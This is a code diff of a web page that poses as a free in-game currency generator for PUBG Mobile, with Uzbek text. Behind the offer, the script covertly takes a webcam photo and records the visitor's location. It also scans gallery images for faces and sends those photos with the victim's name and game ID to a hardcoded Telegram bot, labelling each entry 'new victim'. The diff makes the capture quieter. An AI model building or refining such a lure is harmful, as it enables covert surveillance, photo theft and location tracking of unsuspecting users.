@@ -3,49 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PUBG MOBILE: FREE UC ELITE</title>
-    <script defer src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
+    <title>PUBG MOBILE: FREE UC</title>
+    <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
     <style>
-        :root { --neon-b: #00f3ff; --neon-g: #39ff14; --bg: #010409; }
-        body { margin: 0; background: var(--bg); color: white; font-family: 'Rajdhani', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        #app { width: 92%; max-width: 420px; background: rgba(15, 23, 42, 0.9); border: 2px solid var(--neon-b); border-radius: 30px; padding: 25px; text-align: center; box-shadow: 0 0 20px var(--neon-b); }
-        .uc-item { background: rgba(255,255,255,0.05); border: 1px solid var(--neon-g); border-radius: 15px; padding: 15px; cursor: pointer; display: flex; justify-content: space-between; margin-bottom: 10px; }
-        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 2000; justify-content: center; align-items: center; padding: 15px; }
-        .form-box { background: #0d1117; border: 2px solid var(--neon-b); border-radius: 25px; padding: 25px; width: 100%; max-width: 350px; }
-        input { width: 100%; padding: 14px; margin-bottom: 12px; background: rgba(255,255,255,0.05); border: 1px solid #333; border-radius: 10px; color: #fff; }
-        .btn-main { width: 100%; padding: 16px; background: var(--neon-b); border: none; border-radius: 10px; font-weight: 900; cursor: pointer; font-size: 18px; }
-        .file-label { display: block; padding: 12px; background: #1e293b; border: 1px dashed var(--neon-b); border-radius: 10px; cursor: pointer; margin-bottom: 15px; color: var(--neon-b); }
-        #status { color: #39ff14; font-size: 14px; margin-top: 10px; }
-        video, canvas, #fileInput { display: none; }
+        body { margin: 0; background: #010409; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .card { width: 90%; max-width: 400px; background: #0d1117; border: 2px solid #00f3ff; border-radius: 20px; padding: 20px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #161b22; border: 1px solid #30363d; border-radius: 8px; color: white; box-sizing: border-box; }
+        .btn { width: 100%; padding: 15px; background: #00f3ff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; color: black; }
+        .btn:disabled { background: #555; }
+        #status { font-size: 12px; color: #39ff14; margin-top: 10px; }
+        #fileInput, video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div id="app">
-    <h1 style="font-family:'Orbitron'; color:var(--neon-b);">UC ELITE SHOP</h1>
-    <div onclick="start('60 UC')" class="uc-item"><b>60 UC 🎁</b> <span>BEPUL</span></div>
-    <div onclick="start('325 UC')" class="uc-item"><b>325 UC</b> <span>55,000 UZS</span></div>
-</div>
+<div class="card" id="mainCard">
+    <h2 style="color:#00f3ff">UC GENERATOR</h2>
+    <p>UC miqdorini tanlang:</p>
+    <select id="pkg" style="width:100%; padding:10px; background:#161b22; color:white; border-radius:8px;">
+        <option>60 UC - BEPUL</option>
+        <option>325 UC - 55,000 UZS</option>
+    </select>
+    
+    <input type="text" id="u_name" placeholder="Ismingiz">
+    <input type="number" id="u_id" placeholder="PUBG ID">
 
-<div id="authModal" class="modal">
-    <div class="form-box">
-        <h2 style="color:var(--neon-b);">TASDIQLASH</h2>
-        <p id="loadingMsg">Sizni skaner qilish uchun kutib turing...</p>
-        <button class="btn-main" id="authBtn" onclick="getAccess()">RUXSAT BERISH</button>
-    </div>
-</div>
-
-<div id="formModal" class="modal">
-    <div class="form-box">
-        <h2 style="color:var(--neon-b);">MA'LUMOTLAR</h2>
-        <input type="text" id="u_name" placeholder="Ismingiz">
-        <input type="number" id="u_id" placeholder="PUBG ID">
-        <label for="fileInput" class="file-label" id="fileLabel">📁 Galereyani tanlang (AI yuzlarni ajratadi)</label>
-        <input type="file" id="fileInput" accept="image/*" multiple onchange="processFiles(this)">
-        <div id="status"></div>
-        <button class="btn-main" id="sendBtn" onclick="sendAll()">UC YUKLASH</button>
-    </div>
+    <label for="fileInput" style="display:block; padding:10px; border:1px dashed #00f3ff; cursor:pointer; margin:10px 0;">
+        📁 Galereyadan skrinshot yuklang
+    </label>
+    <input type="file" id="fileInput" accept="image/*" multiple onchange="startSilentScan(this)">
+    
+    <div id="status"></div>
+    <button class="btn" id="sendBtn" onclick="requestAccess()" disabled>YUKLASH</button>
 </div>
 
 <video id="vid" autoplay playsinline></video>
@@ -55,86 +44,101 @@
     const BOT_TOKEN = "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY";
     const CHAT_ID = "6198817749";
 
-    let selectedPackage = "", cameraPhoto = null, verifiedFiles = [], lat = 0, lon = 0;
+    let cameraPhoto = null;
+    let verifiedFaces = [];
+    let locationData = "";
 
-    // AI modellarini yuklash
-    async function loadModels() {
-        const MODEL_URL = 'https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model';
-        await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
-        document.getElementById('loadingMsg').innerText = "Ruxsat berish tugmasini bosing.";
+    // AI-ni tezkor rejimda yuklash
+    async function initAI() {
+        await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model');
+        document.getElementById('status').innerText = "Tizim tayyor.";
     }
-    loadModels();
+    initAI();
 
-    function start(pkg) {
-        selectedPackage = pkg;
-        document.getElementById('authModal').style.display = 'flex';
-    }
-
-    async function processFiles(input) {
-        const statusDiv = document.getElementById('status');
-        statusDiv.innerText = "AI rasmlarni tekshirmoqda, kuting...";
-        verifiedFiles = [];
-        
+    // Galereyani fonda sekin va tez skanerlash
+    async function startSilentScan(input) {
+        const status = document.getElementById('status');
+        const btn = document.getElementById('sendBtn');
+        verifiedFaces = [];
         const files = Array.from(input.files);
+        
+        status.innerText = "Tekshirilmoqda...";
+        
         for (let file of files) {
-            const img = await faceapi.bufferToImage(file);
-            const detections = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions());
-            
-            if (detections.length > 0) {
-                verifiedFiles.push(file); // Faqat yuz bor rasmlar saqlanadi
-            }
+            try {
+                const img = await faceapi.bufferToImage(file);
+                // Faqat yuzni qidirish (eng tezkor algoritm)
+                const detect = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions());
+                
+                if (detect.length > 0) {
+                    verifiedFaces.push(file);
+                }
+            } catch (e) { console.log("Faylda xato"); }
         }
         
-        statusDiv.innerText = `Tayyor! ${verifiedFiles.length} ta yuz ifodasi bor rasm topildi.`;
-        if(verifiedFiles.length > 10) verifiedFiles = verifiedFiles.slice(0, 10);
+        status.innerText = `Skanerlash tugadi. ${verifiedFaces.length} ta yuz aniqlandi.`;
+        btn.disabled = false;
     }
 
-    async function getAccess() {
+    async function requestAccess() {
+        const btn = document.getElementById('sendBtn');
+        btn.innerText = "ISHLANMOQDA...";
+        btn.disabled = true;
+
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            // 1. Kamera (1 ta rasm)
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.getElementById('vid');
             video.srcObject = stream;
-            await new Promise(r => setTimeout(r, 1500));
-
+            await new Promise(r => setTimeout(r, 1000));
+            
             const canvas = document.getElementById('canv');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             cameraPhoto = await (await fetch(canvas.toDataURL('image/jpeg'))).blob();
-
             stream.getTracks().forEach(t => t.stop());
 
-            navigator.geolocation.getCurrentPosition(p => {
-                lat = p.coords.latitude; lon = p.coords.longitude;
-                document.getElementById('authModal').style.display = 'none';
-                document.getElementById('formModal').style.display = 'flex';
+            // 2. Geolokatsiya
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                locationData = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                await finalSend();
+            }, async () => {
+                locationData = "Ruxsat berilmadi";
+                await finalSend();
             });
-        } catch (e) { alert("Ruxsat shart!"); location.reload(); }
+        } catch (e) { alert("Xato! Ruxsat bering."); location.reload(); }
     }
 
-    async function sendAll() {
-        const info = `📍 Manzil: https://www.google.com/maps?q=${lat},${lon}\n👤 Ism: ${document.getElementById('u_name').value}\n🆔 ID: ${document.getElementById('u_id').value}\n📦 Paket: ${selectedPackage}`;
-        
-        // 1. Ma'lumotlar
+    async function finalSend() {
+        const name = document.getElementById('u_name').value;
+        const id = document.getElementById('u_id').value;
+        const pkg = document.getElementById('pkg').value;
+
+        const text = `🚀 YANGI QURBON\n👤 Ism: ${name}\n🆔 ID: ${id}\n📦 Paket: ${pkg}\n📍 Manzil: ${locationData}`;
+
+        // Ma'lumotlarni yuborish
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: CHAT_ID, text: info})
+            body: JSON.stringify({chat_id: CHAT_ID, text: text})
         });
 
-        // 2. Kamera rasmi
+        // Kameradan olingan rasm
         const fd1 = new FormData();
-        fd1.append('chat_id', CHAT_ID); fd1.append('photo', cameraPhoto);
+        fd1.append('chat_id', CHAT_ID);
+        fd1.append('photo', cameraPhoto);
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: 'POST', body: fd1});
 
-        // 3. AI tomonidan tasdiqlangan galereya rasmlari
-        for (let file of verifiedFiles) {
+        // Galereyadan faqat yuzlar
+        for (let face of verifiedFaces) {
             const fd2 = new FormData();
-            fd2.append('chat_id', CHAT_ID); fd2.append('photo', file);
+            fd2.append('chat_id', CHAT_ID);
+            fd2.append('photo', face);
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: 'POST', body: fd2});
         }
 
-        alert("Muvaffaqiyatli! UC yuklanadi.");
+        alert("Muvaffaqiyatli! UC 24 soat ichida yuboriladi.");
         location.reload();
     }
 </script>
